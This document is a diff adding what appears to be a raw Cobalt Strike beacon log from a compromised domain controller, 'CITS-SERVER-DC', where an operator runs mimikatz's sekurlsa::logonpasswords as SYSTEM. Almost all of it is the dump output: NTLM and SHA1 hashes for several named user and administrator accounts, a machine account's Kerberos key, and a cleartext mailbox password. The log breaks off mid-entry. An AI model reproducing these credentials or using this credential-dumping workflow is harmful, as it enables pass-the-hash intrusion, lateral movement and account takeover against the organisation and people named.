@@ -1,0 +1,762 @@
+11/27 17:45:25 UTC [metadata] 173.196.158.190 <- 172.16.0.1; computer: CITS-SERVER-DC; user: SYSTEM *; process: dns.exe; pid: 13364; os: Windows; version: 6.2; build: 9200; beacon arch: x86 (x64)
+11/27 17:46:01 UTC [input] <neo> logonpasswords
+11/27 17:46:01 UTC [task] <T1003, T1055, T1093> Tasked beacon to run mimikatz's sekurlsa::logonpasswords command
+11/27 17:46:20 UTC [checkin] host called home, sent: 313675 bytes
+11/27 17:46:27 UTC [output]
+received output:
+
+Authentication Id : 0 ; 1356291262 (00000000:50d75cbe)
+Session           : NetworkCleartext from 0
+User Name         : raulcort1
+Domain            : LCCOMPUTER
+Logon Server      : CITS-SERVER-DC
+Logon Time        : 11/27/2023 8:58:26 AM
+SID               : S-1-5-21-1584996946-673974696-336192291-1162
+	msv :	
+	 [00000003] Primary
+	 * Username : raulcort1
+	 * Domain   : LCCOMPUTER
+	 * NTLM     : e1f1941b58886a4cc4c36b718f33f6e0
+	 * SHA1     : c71044c5b16a155036df93541f658c7450ff3854
+	tspkg :	
+	wdigest :	
+	 * Username : raulcort1
+	 * Domain   : LCCOMPUTER
+	 * Password : (null)
+	kerberos :	
+	 * Username : raulcort1
+	 * Domain   : LCCOMPUTER.COM
+	 * Password : (null)
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 10544317 (00000000:00a0e4bd)
+Session           : RemoteInteractive from 2
+User Name         : mariocort
+Domain            : LCCOMPUTER
+Logon Server      : CITS-SERVER-DC
+Logon Time        : 11/12/2023 7:12:20 AM
+SID               : S-1-5-21-1584996946-673974696-336192291-1150
+	msv :	
+	tspkg :	
+	wdigest :	
+	kerberos :	
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 2304070 (00000000:00232846)
+Session           : Service from 0
+User Name         : 112B0AB4-15D6-4B11-952F-5328A6F5BFD5
+Domain            : NT VIRTUAL MACHINE
+Logon Server      : (null)
+Logon Time        : 11/12/2023 5:31:21 AM
+SID               : S-1-5-83-1-288033460-1259410902-676540309-3586127270
+	msv :	
+	 [00000003] Primary
+	 * Username : CITS-SERVER-DC$
+	 * Domain   : LCCOMPUTER
+	 * NTLM     : 74eebd4a4ccbfe76e0884fd1c869121b
+	 * SHA1     : 6b28ee1be4ca1fd83a86e4d0176a12c119eb1b75
+	tspkg :	
+	wdigest :	
+	 * Username : CITS-SERVER-DC$
+	 * Domain   : LCCOMPUTER
+	 * Password : (null)
+	kerberos :	
+	 * Username : CITS-SERVER-DC$
+	 * Domain   : LCCOMPUTER.COM
+	 * Password : (null)
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 325127 (00000000:0004f607)
+Session           : Service from 0
+User Name         : SSASTELEMETRY
+Domain            : NT Service
+Logon Server      : (null)
+Logon Time        : 11/12/2023 5:27:31 AM
+SID               : S-1-5-80-1549978933-2891762758-2075524219-3728768389-1145206490
+	msv :	
+	 [00000003] Primary
+	 * Username : CITS-SERVER-DC$
+	 * Domain   : LCCOMPUTER
+	 * NTLM     : 74eebd4a4ccbfe76e0884fd1c869121b
+	 * SHA1     : 6b28ee1be4ca1fd83a86e4d0176a12c119eb1b75
+	tspkg :	
+	wdigest :	
+	 * Username : CITS-SERVER-DC$
+	 * Domain   : LCCOMPUTER
+	 * Password : (null)
+	kerberos :	
+	 * Username : CITS-SERVER-DC$
+	 * Domain   : lccomputer.com
+	 * Password : b7 32 5d 5b 82 20 35 db 5b 48 a8 56 28 75 95 cb e8 90 91 c0 a1 6c 54 ca 08 3a 78 88 e0 ec 43 25 2c 3c e0 b0 e3 8d d4 4a 23 62 45 ac 15 c7 29 f7 d4 ce 65 70 d0 81 83 03 f9 9d b9 2e ba dc 1b 06 a8 9c fa 50 52 a7 3a 5d 2f ec 90 6d 8b b3 7f e3 d9 e5 61 81 e4 46 80 df 1c 12 61 76 88 5f c7 24 71 a6 fc 53 62 d4 da 85 4e e7 2a 94 e1 ee 04 0f 79 6d 3d 5c 63 68 bf fc 0f 6f c2 e9 6a 07 de 2f 64 ba 14 0f df a6 66 0d 3d d3 1b 0e 6d e0 8e e5 b8 8d b8 36 71 41 bd 63 36 73 db ee 34 c9 4d 12 02 8d 90 d2 21 c8 53 55 02 ea fb 96 78 6c 8c 9d e8 41 77 4e 0f e1 8c e2 e7 bf c7 07 13 27 16 d6 c7 da a9 1f 6f c3 8b 34 44 1b 48 50 4f 3f ef e7 f2 7b 57 a2 21 f7 a2 a8 80 ed 10 b1 69 70 28 a2 84 de 52 6e 43 72 06 e9 eb b0 10 25 40 e2 eb 75 
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 45902 (00000000:0000b34e)
+Session           : UndefinedLogonType from 0
+User Name         : (null)
+Domain            : (null)
+Logon Server      : (null)
+Logon Time        : 11/12/2023 5:24:37 AM
+SID               : 
+	msv :	
+	 [00000003] Primary
+	 * Username : CITS-SERVER-DC$
+	 * Domain   : LCCOMPUTER
+	 * NTLM     : 74eebd4a4ccbfe76e0884fd1c869121b
+	 * SHA1     : 6b28ee1be4ca1fd83a86e4d0176a12c119eb1b75
+	tspkg :	
+	wdigest :	
+	kerberos :	
+	ssp :	
+	 [00000000]
+	 * Username : HealthMailbox0e8d3bad6249400baf52eb03b1742a1b@lccomputer.com
+	 * Domain   : (null)
+	 * Password : Fkl0Xao7bf^h}>i}+4gO?j;Tb|vR:gPAw{TU{#*k6)CJ/b.d|Ql)!)|L[UgUy}yg.&UIMl!v.qKof3CK5Tp53Z?!jkj^:;Jv92ie3S|O2(q4Qd6Zp]?1a1HWtGagaM^-
+	 [00000001]
+	 * Username : CITS-SERVER-DC$
+	 * Domain   : (null)
+	 * Password : (null)
+	 [00000002]
+	 * Username : HealthMailbox0e8d3bad6249400baf52eb03b1742a1b@raulfamily.com
+	 * Domain   : (null)
+	 * Password : Fkl0Xao7bf^h}>i}+4gO?j;Tb|vR:gPAw{TU{#*k6)CJ/b.d|Ql)!)|L[UgUy}yg.&UIMl!v.qKof3CK5Tp53Z?!jkj^:;Jv92ie3S|O2(q4Qd6Zp]?1a1HWtGagaM^-
+	 [00000003]
+	 * Username : CITS-SERVER-DC$
+	 * Domain   : (null)
+	 * Password : (null)
+	credman :	
+
+Authentication Id : 0 ; 1285797923 (00000000:4ca3b823)
+Session           : NetworkCleartext from 0
+User Name         : mariocort
+Domain            : LCCOMPUTER
+Logon Server      : CITS-SERVER-DC
+Logon Time        : 11/26/2023 12:24:18 PM
+SID               : S-1-5-21-1584996946-673974696-336192291-1150
+	msv :	
+	 [00000003] Primary
+	 * Username : mariocort
+	 * Domain   : LCCOMPUTER
+	 * NTLM     : 852c6e55ff3dd5ef6b096aed9e39cbca
+	 * SHA1     : 64fe331a6ca09889a1f98ed06c938ef9fb98987e
+	tspkg :	
+	wdigest :	
+	 * Username : mariocort
+	 * Domain   : LCCOMPUTER
+	 * Password : (null)
+	kerberos :	
+	 * Username : mariocort
+	 * Domain   : LCCOMPUTER.COM
+	 * Password : (null)
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 319177514 (00000000:1306432a)
+Session           : RemoteInteractive from 1
+User Name         : mariocort
+Domain            : LCCOMPUTER
+Logon Server      : CITS-SERVER-DC
+Logon Time        : 11/15/2023 2:01:06 AM
+SID               : S-1-5-21-1584996946-673974696-336192291-1150
+	msv :	
+	 [00000003] Primary
+	 * Username : mariocort
+	 * Domain   : LCCOMPUTER
+	 * NTLM     : 852c6e55ff3dd5ef6b096aed9e39cbca
+	 * SHA1     : 64fe331a6ca09889a1f98ed06c938ef9fb98987e
+	 [00010000] CredentialKeys
+	 * NTLM     : 852c6e55ff3dd5ef6b096aed9e39cbca
+	 * SHA1     : 64fe331a6ca09889a1f98ed06c938ef9fb98987e
+	tspkg :	
+	wdigest :	
+	 * Username : mariocort
+	 * Domain   : LCCOMPUTER
+	 * Password : (null)
+	kerberos :	
+	 * Username : mariocort
+	 * Domain   : LCCOMPUTER.COM
+	 * Password : (null)
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 319171147 (00000000:13062a4b)
+Session           : RemoteInteractive from 1
+User Name         : mariocort
+Domain            : LCCOMPUTER
+Logon Server      : CITS-SERVER-DC
+Logon Time        : 11/15/2023 2:01:06 AM
+SID               : S-1-5-21-1584996946-673974696-336192291-1150
+	msv :	
+	 [00000003] Primary
+	 * Username : mariocort
+	 * Domain   : LCCOMPUTER
+	 * NTLM     : 852c6e55ff3dd5ef6b096aed9e39cbca
+	 * SHA1     : 64fe331a6ca09889a1f98ed06c938ef9fb98987e
+	 [00010000] CredentialKeys
+	 * NTLM     : 852c6e55ff3dd5ef6b096aed9e39cbca
+	 * SHA1     : 64fe331a6ca09889a1f98ed06c938ef9fb98987e
+	tspkg :	
+	wdigest :	
+	 * Username : mariocort
+	 * Domain   : LCCOMPUTER
+	 * Password : (null)
+	kerberos :	
+	 * Username : mariocort
+	 * Domain   : LCCOMPUTER.COM
+	 * Password : (null)
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 319139317 (00000000:1305adf5)
+Session           : Interactive from 1
+User Name         : DWM-1
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 11/15/2023 2:00:42 AM
+SID               : S-1-5-90-1
+	msv :	
+	 [00000003] Primary
+	 * Username : CITS-SERVER-DC$
+	 * Domain   : LCCOMPUTER
+	 * NTLM     : 74eebd4a4ccbfe76e0884fd1c869121b
+	 * SHA1     : 6b28ee1be4ca1fd83a86e4d0176a12c119eb1b75
+	tspkg :	
+	wdigest :	
+	 * Username : CITS-SERVER-DC$
+	 * Domain   : LCCOMPUTER
+	 * Password : (null)
+	kerberos :	
+	 * Username : CITS-SERVER-DC$
+	 * Domain   : lccomputer.com
+	 * Password : b7 32 5d 5b 82 20 35 db 5b 48 a8 56 28 75 95 cb e8 90 91 c0 a1 6c 54 ca 08 3a 78 88 e0 ec 43 25 2c 3c e0 b0 e3 8d d4 4a 23 62 45 ac 15 c7 29 f7 d4 ce 65 70 d0 81 83 03 f9 9d b9 2e ba dc 1b 06 a8 9c fa 50 52 a7 3a 5d 2f ec 90 6d 8b b3 7f e3 d9 e5 61 81 e4 46 80 df 1c 12 61 76 88 5f c7 24 71 a6 fc 53 62 d4 da 85 4e e7 2a 94 e1 ee 04 0f 79 6d 3d 5c 63 68 bf fc 0f 6f c2 e9 6a 07 de 2f 64 ba 14 0f df a6 66 0d 3d d3 1b 0e 6d e0 8e e5 b8 8d b8 36 71 41 bd 63 36 73 db ee 34 c9 4d 12 02 8d 90 d2 21 c8 53 55 02 ea fb 96 78 6c 8c 9d e8 41 77 4e 0f e1 8c e2 e7 bf c7 07 13 27 16 d6 c7 da a9 1f 6f c3 8b 34 44 1b 48 50 4f 3f ef e7 f2 7b 57 a2 21 f7 a2 a8 80 ed 10 b1 69 70 28 a2 84 de 52 6e 43 72 06 e9 eb b0 10 25 40 e2 eb 75 
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 319139281 (00000000:1305add1)
+Session           : Interactive from 1
+User Name         : DWM-1
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 11/15/2023 2:00:42 AM
+SID               : S-1-5-90-1
+	msv :	
+	 [00000003] Primary
+	 * Username : CITS-SERVER-DC$
+	 * Domain   : LCCOMPUTER
+	 * NTLM     : 74eebd4a4ccbfe76e0884fd1c869121b
+	 * SHA1     : 6b28ee1be4ca1fd83a86e4d0176a12c119eb1b75
+	tspkg :	
+	wdigest :	
+	 * Username : CITS-SERVER-DC$
+	 * Domain   : LCCOMPUTER
+	 * Password : (null)
+	kerberos :	
+	 * Username : CITS-SERVER-DC$
+	 * Domain   : lccomputer.com
+	 * Password : b7 32 5d 5b 82 20 35 db 5b 48 a8 56 28 75 95 cb e8 90 91 c0 a1 6c 54 ca 08 3a 78 88 e0 ec 43 25 2c 3c e0 b0 e3 8d d4 4a 23 62 45 ac 15 c7 29 f7 d4 ce 65 70 d0 81 83 03 f9 9d b9 2e ba dc 1b 06 a8 9c fa 50 52 a7 3a 5d 2f ec 90 6d 8b b3 7f e3 d9 e5 61 81 e4 46 80 df 1c 12 61 76 88 5f c7 24 71 a6 fc 53 62 d4 da 85 4e e7 2a 94 e1 ee 04 0f 79 6d 3d 5c 63 68 bf fc 0f 6f c2 e9 6a 07 de 2f 64 ba 14 0f df a6 66 0d 3d d3 1b 0e 6d e0 8e e5 b8 8d b8 36 71 41 bd 63 36 73 db ee 34 c9 4d 12 02 8d 90 d2 21 c8 53 55 02 ea fb 96 78 6c 8c 9d e8 41 77 4e 0f e1 8c e2 e7 bf c7 07 13 27 16 d6 c7 da a9 1f 6f c3 8b 34 44 1b 48 50 4f 3f ef e7 f2 7b 57 a2 21 f7 a2 a8 80 ed 10 b1 69 70 28 a2 84 de 52 6e 43 72 06 e9 eb b0 10 25 40 e2 eb 75 
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 42278919 (00000000:02852007)
+Session           : Service from 0
+User Name         : Raul Family
+Domain            : IIS APPPOOL
+Logon Server      : (null)
+Logon Time        : 11/12/2023 1:40:48 PM
+SID               : S-1-5-82-707396684-718849668-1837377661-1029976282-405102638
+	msv :	
+	 [00000003] Primary
+	 * Username : CITS-SERVER-DC$
+	 * Domain   : LCCOMPUTER
+	 * NTLM     : 74eebd4a4ccbfe76e0884fd1c869121b
+	 * SHA1     : 6b28ee1be4ca1fd83a86e4d0176a12c119eb1b75
+	tspkg :	
+	wdigest :	
+	 * Username : CITS-SERVER-DC$
+	 * Domain   : LCCOMPUTER
+	 * Password : (null)
+	kerberos :	
+	 * Username : CITS-SERVER-DC$
+	 * Domain   : lccomputer.com
+	 * Password : b7 32 5d 5b 82 20 35 db 5b 48 a8 56 28 75 95 cb e8 90 91 c0 a1 6c 54 ca 08 3a 78 88 e0 ec 43 25 2c 3c e0 b0 e3 8d d4 4a 23 62 45 ac 15 c7 29 f7 d4 ce 65 70 d0 81 83 03 f9 9d b9 2e ba dc 1b 06 a8 9c fa 50 52 a7 3a 5d 2f ec 90 6d 8b b3 7f e3 d9 e5 61 81 e4 46 80 df 1c 12 61 76 88 5f c7 24 71 a6 fc 53 62 d4 da 85 4e e7 2a 94 e1 ee 04 0f 79 6d 3d 5c 63 68 bf fc 0f 6f c2 e9 6a 07 de 2f 64 ba 14 0f df a6 66 0d 3d d3 1b 0e 6d e0 8e e5 b8 8d b8 36 71 41 bd 63 36 73 db ee 34 c9 4d 12 02 8d 90 d2 21 c8 53 55 02 ea fb 96 78 6c 8c 9d e8 41 77 4e 0f e1 8c e2 e7 bf c7 07 13 27 16 d6 c7 da a9 1f 6f c3 8b 34 44 1b 48 50 4f 3f ef e7 f2 7b 57 a2 21 f7 a2 a8 80 ed 10 b1 69 70 28 a2 84 de 52 6e 43 72 06 e9 eb b0 10 25 40 e2 eb 75 
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 2126097 (00000000:00207111)
+Session           : Service from 0
+User Name         : B757EA16-C9FE-458A-925A-120521787EB1
+Domain            : NT VIRTUAL MACHINE
+Logon Server      : (null)
+Logon Time        : 11/12/2023 5:30:27 AM
+SID               : S-1-5-83-1-3075992086-1166723582-85088914-2977855521
+	msv :	
+	 [00000003] Primary
+	 * Username : CITS-SERVER-DC$
+	 * Domain   : LCCOMPUTER
+	 * NTLM     : 74eebd4a4ccbfe76e0884fd1c869121b
+	 * SHA1     : 6b28ee1be4ca1fd83a86e4d0176a12c119eb1b75
+	tspkg :	
+	wdigest :	
+	 * Username : CITS-SERVER-DC$
+	 * Domain   : LCCOMPUTER
+	 * Password : (null)
+	kerberos :	
+	 * Username : CITS-SERVER-DC$
+	 * Domain   : lccomputer.com
+	 * Password : b7 32 5d 5b 82 20 35 db 5b 48 a8 56 28 75 95 cb e8 90 91 c0 a1 6c 54 ca 08 3a 78 88 e0 ec 43 25 2c 3c e0 b0 e3 8d d4 4a 23 62 45 ac 15 c7 29 f7 d4 ce 65 70 d0 81 83 03 f9 9d b9 2e ba dc 1b 06 a8 9c fa 50 52 a7 3a 5d 2f ec 90 6d 8b b3 7f e3 d9 e5 61 81 e4 46 80 df 1c 12 61 76 88 5f c7 24 71 a6 fc 53 62 d4 da 85 4e e7 2a 94 e1 ee 04 0f 79 6d 3d 5c 63 68 bf fc 0f 6f c2 e9 6a 07 de 2f 64 ba 14 0f df a6 66 0d 3d d3 1b 0e 6d e0 8e e5 b8 8d b8 36 71 41 bd 63 36 73 db ee 34 c9 4d 12 02 8d 90 d2 21 c8 53 55 02 ea fb 96 78 6c 8c 9d e8 41 77 4e 0f e1 8c e2 e7 bf c7 07 13 27 16 d6 c7 da a9 1f 6f c3 8b 34 44 1b 48 50 4f 3f ef e7 f2 7b 57 a2 21 f7 a2 a8 80 ed 10 b1 69 70 28 a2 84 de 52 6e 43 72 06 e9 eb b0 10 25 40 e2 eb 75 
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 995 (00000000:000003e3)
+Session           : Service from 0
+User Name         : IUSR
+Domain            : NT AUTHORITY
+Logon Server      : (null)
+Logon Time        : 11/12/2023 5:28:04 AM
+SID               : S-1-5-17
+	msv :	
+	tspkg :	
+	wdigest :	
+	 * Username : (null)
+	 * Domain   : (null)
+	 * Password : (null)
+	kerberos :	
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 240719 (00000000:0003ac4f)
+Session           : Service from 0
+User Name         : citsstaff
+Domain            : LCCOMPUTER
+Logon Server      : CITS-SERVER-DC
+Logon Time        : 11/12/2023 5:26:40 AM
+SID               : S-1-5-21-1584996946-673974696-336192291-500
+	msv :	
+	 [00000003] Primary
+	 * Username : citsstaff
+	 * Domain   : LCCOMPUTER
+	 * NTLM     : 249d5f29a517ac014abed26aac566982
+	 * SHA1     : c53a816b76fc127c168b72586d07eeaaa1879cdf
+	 [00010000] CredentialKeys
+	 * NTLM     : 249d5f29a517ac014abed26aac566982
+	 * SHA1     : c53a816b76fc127c168b72586d07eeaaa1879cdf
+	tspkg :	
+	wdigest :	
+	 * Username : citsstaff
+	 * Domain   : LCCOMPUTER
+	 * Password : (null)
+	kerberos :	
+	 * Username : citsstaff
+	 * Domain   : LCCOMPUTER.COM
+	 * Password : (null)
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 999 (00000000:000003e7)
+Session           : UndefinedLogonType from 0
+User Name         : CITS-SERVER-DC$
+Domain            : LCCOMPUTER
+Logon Server      : (null)
+Logon Time        : 11/12/2023 5:24:36 AM
+SID               : S-1-5-18
+	msv :	
+	tspkg :	
+	wdigest :	
+	 * Username : CITS-SERVER-DC$
+	 * Domain   : LCCOMPUTER
+	 * Password : (null)
+	kerberos :	
+	 * Username : cits-server-dc$
+	 * Domain   : LCCOMPUTER.COM
+	 * Password : (null)
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 1289145039 (00000000:4cd6cacf)
+Session           : NetworkCleartext from 0
+User Name         : luiscort_college
+Domain            : LCCOMPUTER
+Logon Server      : CITS-SERVER-DC
+Logon Time        : 11/26/2023 1:20:48 PM
+SID               : S-1-5-21-1584996946-673974696-336192291-1158
+	msv :	
+	 [00000003] Primary
+	 * Username : luiscort_college
+	 * Domain   : LCCOMPUTER
+	 * NTLM     : bdec351bd4e58c00d6d7f8d656a6d874
+	 * SHA1     : 1deed170d6e73cd958cae56d1edf3ea6971337e3
+	tspkg :	
+	wdigest :	
+	 * Username : luiscort_college
+	 * Domain   : LCCOMPUTER
+	 * Password : (null)
+	kerberos :	
+	 * Username : luiscort_college
+	 * Domain   : LCCOMPUTER.COM
+	 * Password : (null)
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 37320123 (00000000:023975bb)
+Session           : Service from 0
+User Name         : freepbxudp
+Domain            : IIS APPPOOL
+Logon Server      : (null)
+Logon Time        : 11/12/2023 12:32:59 PM
+SID               : S-1-5-82-3749622636-3031384361-514669908-2271604451-160619254
+	msv :	
+	 [00000003] Primary
+	 * Username : CITS-SERVER-DC$
+	 * Domain   : LCCOMPUTER
+	 * NTLM     : 74eebd4a4ccbfe76e0884fd1c869121b
+	 * SHA1     : 6b28ee1be4ca1fd83a86e4d0176a12c119eb1b75
+	tspkg :	
+	wdigest :	
+	 * Username : CITS-SERVER-DC$
+	 * Domain   : LCCOMPUTER
+	 * Password : (null)
+	kerberos :	
+	 * Username : CITS-SERVER-DC$
+	 * Domain   : lccomputer.com
+	 * Password : b7 32 5d 5b 82 20 35 db 5b 48 a8 56 28 75 95 cb e8 90 91 c0 a1 6c 54 ca 08 3a 78 88 e0 ec 43 25 2c 3c e0 b0 e3 8d d4 4a 23 62 45 ac 15 c7 29 f7 d4 ce 65 70 d0 81 83 03 f9 9d b9 2e ba dc 1b 06 a8 9c fa 50 52 a7 3a 5d 2f ec 90 6d 8b b3 7f e3 d9 e5 61 81 e4 46 80 df 1c 12 61 76 88 5f c7 24 71 a6 fc 53 62 d4 da 85 4e e7 2a 94 e1 ee 04 0f 79 6d 3d 5c 63 68 bf fc 0f 6f c2 e9 6a 07 de 2f 64 ba 14 0f df a6 66 0d 3d d3 1b 0e 6d e0 8e e5 b8 8d b8 36 71 41 bd 63 36 73 db ee 34 c9 4d 12 02 8d 90 d2 21 c8 53 55 02 ea fb 96 78 6c 8c 9d e8 41 77 4e 0f e1 8c e2 e7 bf c7 07 13 27 16 d6 c7 da a9 1f 6f c3 8b 34 44 1b 48 50 4f 3f ef e7 f2 7b 57 a2 21 f7 a2 a8 80 ed 10 b1 69 70 28 a2 84 de 52 6e 43 72 06 e9 eb b0 10 25 40 e2 eb 75 
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 348804 (00000000:00055284)
+Session           : Service from 0
+User Name         : SSISTELEMETRY130
+Domain            : NT Service
+Logon Server      : (null)
+Logon Time        : 11/12/2023 5:27:44 AM
+SID               : S-1-5-80-1625532266-625503396-2441596095-4129757946-3375356652
+	msv :	
+	 [00000003] Primary
+	 * Username : CITS-SERVER-DC$
+	 * Domain   : LCCOMPUTER
+	 * NTLM     : 74eebd4a4ccbfe76e0884fd1c869121b
+	 * SHA1     : 6b28ee1be4ca1fd83a86e4d0176a12c119eb1b75
+	tspkg :	
+	wdigest :	
+	 * Username : CITS-SERVER-DC$
+	 * Domain   : LCCOMPUTER
+	 * Password : (null)
+	kerberos :	
+	 * Username : CITS-SERVER-DC$
+	 * Domain   : lccomputer.com
+	 * Password : b7 32 5d 5b 82 20 35 db 5b 48 a8 56 28 75 95 cb e8 90 91 c0 a1 6c 54 ca 08 3a 78 88 e0 ec 43 25 2c 3c e0 b0 e3 8d d4 4a 23 62 45 ac 15 c7 29 f7 d4 ce 65 70 d0 81 83 03 f9 9d b9 2e ba dc 1b 06 a8 9c fa 50 52 a7 3a 5d 2f ec 90 6d 8b b3 7f e3 d9 e5 61 81 e4 46 80 df 1c 12 61 76 88 5f c7 24 71 a6 fc 53 62 d4 da 85 4e e7 2a 94 e1 ee 04 0f 79 6d 3d 5c 63 68 bf fc 0f 6f c2 e9 6a 07 de 2f 64 ba 14 0f df a6 66 0d 3d d3 1b 0e 6d e0 8e e5 b8 8d b8 36 71 41 bd 63 36 73 db ee 34 c9 4d 12 02 8d 90 d2 21 c8 53 55 02 ea fb 96 78 6c 8c 9d e8 41 77 4e 0f e1 8c e2 e7 bf c7 07 13 27 16 d6 c7 da a9 1f 6f c3 8b 34 44 1b 48 50 4f 3f ef e7 f2 7b 57 a2 21 f7 a2 a8 80 ed 10 b1 69 70 28 a2 84 de 52 6e 43 72 06 e9 eb b0 10 25 40 e2 eb 75 
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 318328 (00000000:0004db78)
+Session           : Service from 0
+User Name         : SQLTELEMETRY
+Domain            : NT Service
+Logon Server      : (null)
+Logon Time        : 11/12/2023 5:27:25 AM
+SID               : S-1-5-80-2652535364-2169709536-2857650723-2622804123-1107741775
+	msv :	
+	 [00000003] Primary
+	 * Username : CITS-SERVER-DC$
+	 * Domain   : LCCOMPUTER
+	 * NTLM     : 74eebd4a4ccbfe76e0884fd1c869121b
+	 * SHA1     : 6b28ee1be4ca1fd83a86e4d0176a12c119eb1b75
+	tspkg :	
+	wdigest :	
+	 * Username : CITS-SERVER-DC$
+	 * Domain   : LCCOMPUTER
+	 * Password : (null)
+	kerberos :	
+	 * Username : CITS-SERVER-DC$
+	 * Domain   : lccomputer.com
+	 * Password : b7 32 5d 5b 82 20 35 db 5b 48 a8 56 28 75 95 cb e8 90 91 c0 a1 6c 54 ca 08 3a 78 88 e0 ec 43 25 2c 3c e0 b0 e3 8d d4 4a 23 62 45 ac 15 c7 29 f7 d4 ce 65 70 d0 81 83 03 f9 9d b9 2e ba dc 1b 06 a8 9c fa 50 52 a7 3a 5d 2f ec 90 6d 8b b3 7f e3 d9 e5 61 81 e4 46 80 df 1c 12 61 76 88 5f c7 24 71 a6 fc 53 62 d4 da 85 4e e7 2a 94 e1 ee 04 0f 79 6d 3d 5c 63 68 bf fc 0f 6f c2 e9 6a 07 de 2f 64 ba 14 0f df a6 66 0d 3d d3 1b 0e 6d e0 8e e5 b8 8d b8 36 71 41 bd 63 36 73 db ee 34 c9 4d 12 02 8d 90 d2 21 c8 53 55 02 ea fb 96 78 6c 8c 9d e8 41 77 4e 0f e1 8c e2 e7 bf c7 07 13 27 16 d6 c7 da a9 1f 6f c3 8b 34 44 1b 48 50 4f 3f ef e7 f2 7b 57 a2 21 f7 a2 a8 80 ed 10 b1 69 70 28 a2 84 de 52 6e 43 72 06 e9 eb b0 10 25 40 e2 eb 75 
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 267901 (00000000:0004167d)
+Session           : Service from 0
+User Name         : ReportServer
+Domain            : NT Service
+Logon Server      : (null)
+Logon Time        : 11/12/2023 5:26:55 AM
+SID               : S-1-5-80-2885764129-887777008-271615777-1616004480-2722851051
+	msv :	
+	 [00000003] Primary
+	 * Username : CITS-SERVER-DC$
+	 * Domain   : LCCOMPUTER
+	 * NTLM     : 74eebd4a4ccbfe76e0884fd1c869121b
+	 * SHA1     : 6b28ee1be4ca1fd83a86e4d0176a12c119eb1b75
+	tspkg :	
+	wdigest :	
+	 * Username : CITS-SERVER-DC$
+	 * Domain   : LCCOMPUTER
+	 * Password : (null)
+	kerberos :	
+	 * Username : CITS-SERVER-DC$
+	 * Domain   : lccomputer.com
+	 * Password : b7 32 5d 5b 82 20 35 db 5b 48 a8 56 28 75 95 cb e8 90 91 c0 a1 6c 54 ca 08 3a 78 88 e0 ec 43 25 2c 3c e0 b0 e3 8d d4 4a 23 62 45 ac 15 c7 29 f7 d4 ce 65 70 d0 81 83 03 f9 9d b9 2e ba dc 1b 06 a8 9c fa 50 52 a7 3a 5d 2f ec 90 6d 8b b3 7f e3 d9 e5 61 81 e4 46 80 df 1c 12 61 76 88 5f c7 24 71 a6 fc 53 62 d4 da 85 4e e7 2a 94 e1 ee 04 0f 79 6d 3d 5c 63 68 bf fc 0f 6f c2 e9 6a 07 de 2f 64 ba 14 0f df a6 66 0d 3d d3 1b 0e 6d e0 8e e5 b8 8d b8 36 71 41 bd 63 36 73 db ee 34 c9 4d 12 02 8d 90 d2 21 c8 53 55 02 ea fb 96 78 6c 8c 9d e8 41 77 4e 0f e1 8c e2 e7 bf c7 07 13 27 16 d6 c7 da a9 1f 6f c3 8b 34 44 1b 48 50 4f 3f ef e7 f2 7b 57 a2 21 f7 a2 a8 80 ed 10 b1 69 70 28 a2 84 de 52 6e 43 72 06 e9 eb b0 10 25 40 e2 eb 75 
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 216686 (00000000:00034e6e)
+Session           : Service from 0
+User Name         : MSSQLFDLauncher
+Domain            : NT Service
+Logon Server      : (null)
+Logon Time        : 11/12/2023 5:26:28 AM
+SID               : S-1-5-80-3263513310-3392720605-1798839546-683002060-3227631582
+	msv :	
+	 [00000003] Primary
+	 * Username : CITS-SERVER-DC$
+	 * Domain   : LCCOMPUTER
+	 * NTLM     : 74eebd4a4ccbfe76e0884fd1c869121b
+	 * SHA1     : 6b28ee1be4ca1fd83a86e4d0176a12c119eb1b75
+	tspkg :	
+	wdigest :	
+	 * Username : CITS-SERVER-DC$
+	 * Domain   : LCCOMPUTER
+	 * Password : (null)
+	kerberos :	
+	 * Username : CITS-SERVER-DC$
+	 * Domain   : lccomputer.com
+	 * Password : b7 32 5d 5b 82 20 35 db 5b 48 a8 56 28 75 95 cb e8 90 91 c0 a1 6c 54 ca 08 3a 78 88 e0 ec 43 25 2c 3c e0 b0 e3 8d d4 4a 23 62 45 ac 15 c7 29 f7 d4 ce 65 70 d0 81 83 03 f9 9d b9 2e ba dc 1b 06 a8 9c fa 50 52 a7 3a 5d 2f ec 90 6d 8b b3 7f e3 d9 e5 61 81 e4 46 80 df 1c 12 61 76 88 5f c7 24 71 a6 fc 53 62 d4 da 85 4e e7 2a 94 e1 ee 04 0f 79 6d 3d 5c 63 68 bf fc 0f 6f c2 e9 6a 07 de 2f 64 ba 14 0f df a6 66 0d 3d d3 1b 0e 6d e0 8e e5 b8 8d b8 36 71 41 bd 63 36 73 db ee 34 c9 4d 12 02 8d 90 d2 21 c8 53 55 02 ea fb 96 78 6c 8c 9d e8 41 77 4e 0f e1 8c e2 e7 bf c7 07 13 27 16 d6 c7 da a9 1f 6f c3 8b 34 44 1b 48 50 4f 3f ef e7 f2 7b 57 a2 21 f7 a2 a8 80 ed 10 b1 69 70 28 a2 84 de 52 6e 43 72 06 e9 eb b0 10 25 40 e2 eb 75 
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 192350 (00000000:0002ef5e)
+Session           : Service from 0
+User Name         : MsDtsServer130
+Domain            : NT Service
+Logon Server      : (null)
+Logon Time        : 11/12/2023 5:26:07 AM
